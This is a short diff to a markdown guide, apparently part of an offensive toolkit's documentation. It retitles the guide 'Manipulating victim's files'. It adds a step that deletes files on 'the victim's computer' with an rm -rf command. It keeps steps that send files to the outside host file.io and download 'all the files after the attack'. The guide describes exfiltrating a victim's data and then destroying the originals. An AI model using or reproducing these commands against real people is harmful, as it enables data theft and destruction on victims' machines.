@@ -1,4 +1,4 @@
-# Upload files to file.io
+# Manipulating victim's files
 
 1. Run the following curl script and take note of the **KEY** it returns
     ```shell
@@ -41,7 +41,12 @@
     }
     ```
 
-2. Download all the files after the attack with the following command
+2. Delete the files on the victim's computer
+    ```shell
+    $ rm -rf FILE_NAME_GOES_HERE
+    ```
+
+3. Download all the files after the attack with the following command
     ```shell
     $ curl -X 'GET' \
         'https://file.io/KEY' \
